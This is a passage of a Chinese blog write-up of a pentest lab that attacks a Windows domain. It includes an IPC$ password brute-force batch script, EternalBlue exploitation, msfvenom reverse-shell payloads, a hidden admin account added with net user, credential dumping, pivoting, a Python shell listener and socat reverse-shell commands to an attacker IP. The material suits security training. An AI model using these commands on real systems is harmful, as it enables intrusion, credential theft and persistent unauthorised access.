+<ul>
+<li><p><strong>into outfile</strong></p>
+</li>
+<li><p><strong>into dumpfile</strong></p>
+</li>
+<li><h5 id="官方文档-mysql-5-7-2148页-2178"><a href="#官方文档-mysql-5-7-2148页-2178" class="headerlink" title="官方文档 - mysql-5.7 - 2148页(2178)"></a><strong>官方文档 - mysql-5.7 - 2148页</strong>(2178)</h5><p>• SELECT … INTO OUTFILE writes the selected rows to a file. Column and line terminators can be specified to produce a specific output format. </p>
+<p>• SELECT … INTO DUMPFILE writes a single row to a file without any formatting.</p>
+<ul>
+<li>使用 outfile 方法来导出文件可以支持导出多行，且可以自定义格式，同时形如 ‘\n’ 这样的特殊字符会被被转义，</li>
+<li>使用 dumpfile 方法来导出文件只能导出一行的内容（trick：应该是两行），不会有任何格式化，特殊字符不会被转义（这也是为啥udf提权要用dumpfile写入文件）。</li>
+</ul>
+</li>
+</ul>
+<p>emmm，之后验证一下，是OK的：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305113231.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210305113231433" loading="lazy"></p>
+</blockquote>
+<h5 id="IPC-getshell："><a href="#IPC-getshell：" class="headerlink" title="- $IPC getshell："></a>- $IPC getshell：</h5><p>毕竟扫描到了 <code>135</code> 和 <code>139</code> 端口了嘛，试试看吧。</p>
+<p>先简单看一下有无匿名共享：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305140237.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210305140237129" loading="lazy"></p>
+</blockquote>
+<p>emmm，看起来并不可行，可以试试对用户进行简单的爆破：</p>
+<pre class="language-cmd" data-language="cmd"><code class="language-cmd">@echo off
+set &#x2F;p ip&#x3D;&quot;需要爆破的IP:&quot;
+set &#x2F;p dictName&#x3D;&quot;字典文件路径：&quot;
+set &#x2F;p userName&#x3D;&quot;用户名：&quot;
+for &#x2F;f &quot;delims&#x3D;&quot; %%e in (%dictName%) do (
+	net use \\%ip%\ipc$ &quot;%%e&quot; &#x2F;user:&quot;%userName%&quot; &gt;nul 2&gt;nul 
+		if not errorlevel 1 ( 
+			echo Success: %ip% %userName%:%%e
+        	net use \\%ip%\ipc$ &#x2F;del
+            goto end 
+         )
+         net use * &#x2F;del &#x2F;y &gt;nul 2&gt;nul 
+     )
+:end</code></pre>
+
+<p>不过爆破密码肯定是不太现实，直接跳过吧。</p>
+<h5 id="445永恒之蓝-getshell："><a href="#445永恒之蓝-getshell：" class="headerlink" title="- 445永恒之蓝 getshell："></a>- 445永恒之蓝 getshell：</h5><p>由于这玩意开了 <strong>445</strong> ，可以用 <strong>msf</strong> 试试看：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305140940.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210305140940691" loading="lazy"></p>
+</blockquote>
+<p>成功扫描到了靶机，并且得知靶机是存在 <strong>PENTEST</strong> 这个域中的。可以直接尝试用 <strong>payload</strong> 直接打一波吧：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305141433.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210305141433689" loading="lazy"></p>
+</blockquote>
+<p>现在是拿到了 <strong>meterpreter</strong> 的反弹shell了。</p>
+<h4 id="升级到-msf-反弹-meterptershell（从webshell）："><a href="#升级到-msf-反弹-meterptershell（从webshell）：" class="headerlink" title="- 升级到 msf 反弹 meterptershell（从webshell）："></a>- 升级到 msf 反弹 meterptershell（从webshell）：</h4><p>这里有两种方式进行 <strong>msf</strong> 反弹 <strong>shell</strong> 吧。</p>
+<ul>
+<li><p>第一种，<strong>蚁剑</strong> + <strong>msf木马</strong>：</p>
+<p>首先用 <strong>msf</strong> 生成对应的木马：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">172.16</span>.243.100 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">3367</span> -f exe -o /tmp/re.exe</code></pre>
+
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305130804.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210305130804889" loading="lazy"></p>
+</blockquote>
+<p>然后使用 <strong>蚁剑</strong> 连接 <strong>webshell</strong> 后将其上传：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305131709.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210305131709450" loading="lazy"></p>
+</blockquote>
+<p>然后使用 <strong>msf</strong> 监听：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305131949.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210305131949892" loading="lazy"></p>
+</blockquote>
+<p>在 <strong>蚁剑</strong> 运行一下木马，这时候就拿到了 <strong>msf</strong> 的 <strong>meterpreter</strong> 反弹shell了：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305132058.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210305132058831" loading="lazy"></p>
+</blockquote>
+</li>
+<li><p>第二种，<strong>甜甜圈联动msf</strong>： </p>
+<p>那么，话不多说先把 <strong>甜甜圈</strong> 给装了吧：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305133002.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210305133002560" loading="lazy"></p>
+</blockquote>
+<p>然后简单连接：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305133053.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210305133053715" loading="lazy"></p>
+</blockquote>
+<p>在 <strong>msf</strong> 监听关于 <strong>php</strong> 的反弹shell：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305133429.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210305133429686" loading="lazy"></p>
+</blockquote>
+<p>使用 <strong>甜甜圈</strong> 联动，拿到 <strong>msf</strong> 的 <strong>meterpreter</strong> 反弹shell：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305133620.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210305133619923" loading="lazy"></p>
+</blockquote>
+</li>
+</ul>
+<h4 id="权限提升："><a href="#权限提升：" class="headerlink" title="- 权限提升："></a>- 权限提升：</h4><p>emmm，这个免了吧，这windows靶机对权限管控不太严：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305142640.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210305142640540" loading="lazy"></p>
+</blockquote>
+<p>不妨先 <strong>迁徙</strong> 到别的进程中：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305152221.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210305152221456" loading="lazy"></p>
+</blockquote>
+<p>看起来是可以了：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305152237.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210305152237445" loading="lazy"></p>
+</blockquote>
+<p>那么可以先添加一个用户，</p>
+<pre class="language-none"><code class="language-none">net user dq Qwe123!!! &#x2F;add
+net localgroup administrators dq &#x2F;add</code></pre>
+
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305150418.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210305150418871" loading="lazy"></p>
+</blockquote>
+<p>这里得注意的是，这个添加的 <strong>dq</strong> 用户是属于 <strong>PENTEST</strong> 域的，实际上就是本地趴：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305151142.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210305151142614" loading="lazy"></p>
+</blockquote>
+<h4 id="抓密码："><a href="#抓密码：" class="headerlink" title="- 抓密码："></a>- 抓密码：</h4><p>之后不妨抓一下密码？</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305153326.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210305153326025" loading="lazy"></p>
+</blockquote>
+<p>emmm，然后就能得到 <strong>administrator</strong> 的密码了。</p>
+<h4 id="内网初步扫描"><a href="#内网初步扫描" class="headerlink" title="- 内网初步扫描"></a>- 内网初步扫描</h4><h5 id="当前靶机网络配置："><a href="#当前靶机网络配置：" class="headerlink" title="- 当前靶机网络配置："></a>- 当前靶机网络配置：</h5><p>可以先简单地使用 <strong>ipconfig /all</strong> 命令去查一下：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305143714.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210305143714711" loading="lazy"></p>
+</blockquote>
+<p>这里得到当前机子的主机名为 <code>WIN-QJ9C08DHNTS</code> ，域名为 <code>pentest.com</code> ，处在 <code>172.16.243.0/24</code> 网段。</p>
+<p>然后再查看一下当前用户：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306134342.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306134342224" loading="lazy"></p>
+</blockquote>
+<p>查看当前有几个域：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306134554.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306134554558" loading="lazy"></p>
+</blockquote>
+<p>查看同域机器：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306135343.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306135343010" loading="lazy"></p>
+</blockquote>
+<p>查看当前的域时间：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306135612.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306135612825" loading="lazy"></p>
+</blockquote>
+<p>显然当前 <strong>主域</strong> 的域名即是 <strong>pentest.com</strong> 了，再结合上边得到的域名，可知当前域为 <strong>PENTEST</strong> 。那么可以先看一下当前域，也就是 <strong>PENTEST</strong> 域下的用户：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306140737.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306140736963" loading="lazy"></p>
+</blockquote>
+<p>得到了几个用户，不妨看一下 <strong>域管理员</strong> 和 <strong>本地管理员</strong> ：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306141127.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306141127304" loading="lazy"></p>
+</blockquote>
+<p>因此得到信息：</p>
+<ul>
+<li>域管理员：<strong>Administrator</strong></li>
+<li>本地管理员：<strong>08、Administrator、Domain Admins、dq、Enterprise Admins、lijun、liming</strong></li>
+</ul>
+<p>然后在上边抓密码已经是能得到 <strong>域管理员</strong> 的密码，也就是说现在已经任意可以进入域里边的其他机子了（前提是其他机子开启远程桌面）。</p>
+<p>再查看一下 <strong>域控</strong> ：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306141321.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306141321175" loading="lazy"></p>
+</blockquote>
+<p>OK，当前 <strong>WIN2008</strong> 即是 <strong>域控</strong> 了，也就是说现在已经拿下一个 <strong>域控</strong> 了，这里可以给 <strong>WIN2008</strong> 多添加一个 <strong>域管理员</strong> 用户，不过可能会比较明显，就先用 <strong>Administrator</strong> 这个用户好了。还有一个 <strong>DC2012</strong> 也是域控，不妨把它拿下。</p>
+<h5 id="模拟内网（挂代理）："><a href="#模拟内网（挂代理）：" class="headerlink" title="- 模拟内网（挂代理）："></a>- 模拟内网（挂代理）：</h5><p>由于这个环境是同在一个网段的，这里可以强行模拟成内网环境。即用 <strong>WIN2008</strong> 作为跳板开代理去攻击其他靶机：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305154424.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210305154424090" loading="lazy"> </p>
+</blockquote>
+<p>然后开 <strong>socks5</strong> 趴，毕竟这玩意是 <strong>msf6</strong> 可能？比较稳定了：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305155103.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210305155103701" loading="lazy"></p>
+</blockquote>
+<h5 id="常见端口扫描："><a href="#常见端口扫描：" class="headerlink" title="- 常见端口扫描："></a>- 常见端口扫描：</h5><p>直接用 <strong>msf</strong> 进行扫描吧：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305145137.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210305145137055" loading="lazy"></p>
+</blockquote>
+<p>简单的整理可以得到：</p>
+<pre class="language-none"><code class="language-none">172.16.243.221	88,135,139,445
+172.16.243.222	80,88,135,139,445
+172.16.243.223	135,139,445</code></pre>
+
+<p>emmm由于都开了 <strong>445</strong> ，不如用 <strong>smb服务扫描</strong> 来获取系统名称：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305165850.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210305165849939" loading="lazy"></p>
+</blockquote>
+<p>得到以下信息：</p>
+<ul>
+<li>172.16.243.221：<ul>
+<li>系统：Windows 2012 R2 Standard</li>
+<li>主机名：DC2012</li>
+<li>所在域：PENTEST</li>
+</ul>
+</li>
+<li>172.16.243.222(自己)：<ul>
+<li>系统：Window 2008 R2 Enterprise SP1</li>
+<li>主机名：WIN-QJ9CO8DHNTS</li>
+<li>所在域：PENTEST</li>
+</ul>
+</li>
+<li>172.16.243.223：<ul>
+<li>系统：Windows 7 Ultimate</li>
+<li>主机名：WIN7PC</li>
+<li>所在域：PENTEST</li>
+</ul>
+</li>
+</ul>
+<p>OK，接下来是即是见招拆招，扫一下是否存在 <strong>永恒之蓝</strong> ：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306142210.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306142210344" loading="lazy"></p>
+</blockquote>
+<p>看起来似乎都是存在 <strong>永恒之蓝</strong> 的，不过其他机子也开启了一些如 <strong>135</strong> <strong>139</strong> 这端口，可以简单尝试用 <strong>$IPC</strong> 试试。</p>
+<h4 id="远程登陆："><a href="#远程登陆：" class="headerlink" title="- 远程登陆："></a>- 远程登陆：</h4><p>设置一下 <strong>代理链</strong> 吧：</p>
+<pre class="language-none"><code class="language-none">vim &#x2F;etc&#x2F;proxychains4.conf</code></pre>
+
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305155249.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210305155249824" loading="lazy"></p>
+</blockquote>
+<p>然后尝试打开一下 <strong>远程桌面</strong> 试试看呗，直接上 <strong>msf</strong> 试试：</p>
+<pre class="language-none"><code class="language-none">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp</code></pre>
+
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305145820.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210305145820782" loading="lazy"></p>
+<p>直接连接就行了，当然这里就算不用 <strong>代理链</strong> 也是可以连的，毕竟 <strong>WIN2008</strong> 是外网机，这里只是测试一下 <strong>代理链</strong> 是否成功了：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305155634.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210305155634564" loading="lazy"></p>
+</blockquote>
+<p>至此，就拿下 <strong>WIN2008</strong> 了。</p>
+<hr>
+<h3 id="WIN2012-172-16-243-221-："><a href="#WIN2012-172-16-243-221-：" class="headerlink" title="* WIN2012(172.16.243.221)："></a>* WIN2012(172.16.243.221)：</h3><h4 id="getshell：-1"><a href="#getshell：-1" class="headerlink" title="- getshell："></a>- getshell：</h4><p>首先这台机子从上边即可知道是开启了以下端口：</p>
+<ul>
+<li>88,135,139,445</li>
+</ul>
+<p>不妨以 <strong>WIN2008</strong> 作为跳板，进行攻击。</p>
+<p>相较于一般的 <strong>windows</strong> 反弹shell，大部分都是用 <strong>powershell</strong> 啥的，这里用 <strong>socat</strong> 来演示获取一个 <strong>WIN2008</strong> 的 <strong>cmdshell</strong> 玩玩吧，首先到 (<a target="_blank" rel="noopener" href="https://github.com/StudioEtrange/socat-windows">https://github.com/StudioEtrange/socat-windows</a>) 去将 windows 的 <strong>socat</strong> 给下了，然后上传到 <strong>WIN2008</strong> 上：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306143756.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306143756792" loading="lazy"></p>
+</blockquote>
+<p>然后给 <strong>kali</strong> 简单写一个 <strong>python</strong> 脚本吧，</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> socket <span class="token keyword">import</span> error<span class="token punctuation">,</span> socket<span class="token punctuation">,</span> AF_INET<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">,</span> SOL_SOCKET<span class="token punctuation">,</span> SO_REUSEADDR
+<span class="token keyword">from</span> termios <span class="token keyword">import</span> tcgetattr<span class="token punctuation">,</span> tcsetattr<span class="token punctuation">,</span> TCSADRAIN
+<span class="token keyword">from</span> sys <span class="token keyword">import</span> stdin<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> version_info<span class="token punctuation">,</span> argv
+<span class="token keyword">from</span> tty <span class="token keyword">import</span> setraw
+<span class="token keyword">from</span> os <span class="token keyword">import</span> path<span class="token punctuation">,</span> system<span class="token punctuation">,</span> _exit
+
+<span class="token comment"># import thread, deal with byte</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span>version_info<span class="token punctuation">.</span>major <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">get_byte</span><span class="token punctuation">(</span> s<span class="token punctuation">,</span> encoding <span class="token operator">=</span> <span class="token string">"UTF-8"</span> <span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">bytearray</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> encoding<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+
+    STDOUT <span class="token operator">=</span> stdout
+    <span class="token keyword">import</span> thread
+<span class="token keyword">else</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">get_byte</span><span class="token punctuation">(</span> s<span class="token punctuation">,</span> encoding <span class="token operator">=</span> <span class="token string">"UTF-8"</span> <span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> encoding <span class="token operator">=</span> encoding<span class="token punctuation">)</span>
+
+
+    STDOUT <span class="token operator">=</span> stdout<span class="token punctuation">.</span><span class="token builtin">buffer</span>
+    <span class="token keyword">import</span> _thread <span class="token keyword">as</span> thread
+
+FD <span class="token operator">=</span> <span class="token boolean">None</span>
+OLD_SETTINGS <span class="token operator">=</span> <span class="token boolean">None</span>
+
+
+<span class="token keyword">class</span> <span class="token class-name">_GetchUnix</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__call__</span><span class="token punctuation">(</span> self <span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">global</span> FD<span class="token punctuation">,</span> OLD_SETTINGS
+        FD <span class="token operator">=</span> stdin<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span> <span class="token punctuation">)</span>
+        OLD_SETTINGS <span class="token operator">=</span> tcgetattr<span class="token punctuation">(</span>FD<span class="token punctuation">)</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            setraw<span class="token punctuation">(</span>stdin<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>
+            ch <span class="token operator">=</span> stdin<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+        <span class="token keyword">finally</span><span class="token punctuation">:</span>
+            tcsetattr<span class="token punctuation">(</span>FD<span class="token punctuation">,</span> TCSADRAIN<span class="token punctuation">,</span> OLD_SETTINGS<span class="token punctuation">)</span>
+        <span class="token keyword">return</span> ch
+
+
+getch <span class="token operator">=</span> _GetchUnix<span class="token punctuation">(</span> <span class="token punctuation">)</span>
+
+CONN_ONLINE <span class="token operator">=</span> <span class="token number">1</span>
+
+
+<span class="token keyword">def</span> <span class="token function">stdprint</span><span class="token punctuation">(</span> message <span class="token punctuation">)</span><span class="token punctuation">:</span>
+    stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span>message<span class="token punctuation">)</span>
+    stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span> <span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">close_socket</span><span class="token punctuation">(</span> talk<span class="token punctuation">,</span> exit_code <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">global</span> FD<span class="token punctuation">,</span> OLD_SETTINGS<span class="token punctuation">,</span> CONN_ONLINE
+    CONN_ONLINE <span class="token operator">=</span> <span class="token number">0</span>
+    talk<span class="token punctuation">.</span>close<span class="token punctuation">(</span> <span class="token punctuation">)</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        tcsetattr<span class="token punctuation">(</span>FD<span class="token punctuation">,</span> TCSADRAIN<span class="token punctuation">,</span> OLD_SETTINGS<span class="token punctuation">)</span>
+    <span class="token keyword">except</span> TypeError<span class="token punctuation">:</span>
+        <span class="token keyword">pass</span>
+    system<span class="token punctuation">(</span><span class="token string">"reset"</span><span class="token punctuation">)</span>
+    _exit<span class="token punctuation">(</span>exit_code<span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">recv_daemon</span><span class="token punctuation">(</span> conn <span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">global</span> CONN_ONLINE
+    <span class="token keyword">while</span> CONN_ONLINE<span class="token punctuation">:</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            tmp <span class="token operator">=</span> conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">:</span>
+                STDOUT<span class="token punctuation">.</span>write<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>
+                stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span> <span class="token punctuation">)</span>
+            <span class="token keyword">else</span><span class="token punctuation">:</span>
+                <span class="token keyword">raise</span> error
+        <span class="token keyword">except</span> error<span class="token punctuation">:</span>
+            msg <span class="token operator">=</span> <span class="token string">"Connection close by socket.\n"</span>
+            stdprint<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>
+            close_socket<span class="token punctuation">(</span>conn<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span> port <span class="token punctuation">)</span><span class="token punctuation">:</span>
+    conn <span class="token operator">=</span> socket<span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">)</span>
+    conn<span class="token punctuation">.</span>setsockopt<span class="token punctuation">(</span>SOL_SOCKET<span class="token punctuation">,</span> SO_REUSEADDR<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
+    conn<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    conn<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        talk<span class="token punctuation">,</span> addr <span class="token operator">=</span> conn<span class="token punctuation">.</span>accept<span class="token punctuation">(</span> <span class="token punctuation">)</span>
+        stdprint<span class="token punctuation">(</span><span class="token string">"Connect from %s.\n"</span> <span class="token operator">%</span> addr<span class="token punctuation">[</span> <span class="token number">0</span> <span class="token punctuation">]</span><span class="token punctuation">)</span>
+        thread<span class="token punctuation">.</span>start_new_thread<span class="token punctuation">(</span>recv_daemon<span class="token punctuation">,</span> <span class="token punctuation">(</span>talk<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">while</span> CONN_ONLINE<span class="token punctuation">:</span>
+            c <span class="token operator">=</span> getch<span class="token punctuation">(</span> <span class="token punctuation">)</span>
+            <span class="token keyword">if</span> c<span class="token punctuation">:</span>
+                <span class="token keyword">try</span><span class="token punctuation">:</span>
+                    talk<span class="token punctuation">.</span>send<span class="token punctuation">(</span>get_byte<span class="token punctuation">(</span>c<span class="token punctuation">,</span> encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+                <span class="token keyword">except</span> error<span class="token punctuation">:</span>
+                    <span class="token keyword">break</span>
+    <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>
+        <span class="token keyword">pass</span>
+        <span class="token comment"># stdprint("Connection close by KeyboardInterrupt.\n")</span>
+    <span class="token keyword">finally</span><span class="token punctuation">:</span>
+        stdprint<span class="token punctuation">(</span><span class="token string">"Connection close...\n"</span><span class="token punctuation">)</span>
+        close_socket<span class="token punctuation">(</span>conn<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
+
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"usage:"</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"      python %s [port]"</span> <span class="token operator">%</span> path<span class="token punctuation">.</span>basename<span class="token punctuation">(</span>argv<span class="token punctuation">[</span> <span class="token number">0</span> <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        exit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
+    main<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span> <span class="token number">1</span> <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+</code></pre>
+
+<p>先在 <strong>kali</strong> 上监听，再让 <strong>WIN2008</strong> 进行对接： </p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306150811.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306150811799" loading="lazy"></p>
+</blockquote>
+<p>或者用 <strong>WIN7攻击机</strong> 来用 <strong>socat</strong> 分别玩正向shell和反弹shell也是可以的。</p>
+<ul>
+<li><p>正向shell：</p>
+<p><strong>WIN2008</strong>：</p>
+<pre class="language-none"><code class="language-none">socat.exe tcp-l:3600,fork,reuseaddr exec:cmd,pty,stderr</code></pre>
+
+<p><strong>WIN7攻击机</strong>：</p>
+<pre class="language-none"><code class="language-none">socat.exe - tcp:172.16.243.222:3600</code></pre>
+
+<p>emmm，结果是失败的，似乎被 <strong>入站</strong>  给拦了。</p>
+</li>
+<li><p>反向shell：</p>
+<p><strong>WIN2008</strong>：</p>
+<pre class="language-none"><code class="language-none">socat.exe tcp:172.16.243.101:3601 exec:cmd,pty,stderr</code></pre>
+
+<p><strong>WIN7攻击机</strong>：</p>
+<pre class="language-none"><code class="language-none">socat.exe - tcp-l:3601</code></pre>
+
+<p>这里是成功了：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306155048.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306155048055" loading="lazy"></p>
+</blockquote>
+</li>
+</ul>
+<p>当然用 <strong>powershell</strong> 的反弹shell也是可以的，之所以用反弹shell是因为一般来说 <strong>出站</strong> 规则会比 <strong>入站</strong> 规则宽松一些。</p>
+<p>后边会再写一篇对关于 <strong>windows</strong> 的反弹shell进行一一复现的文章吧。</p>
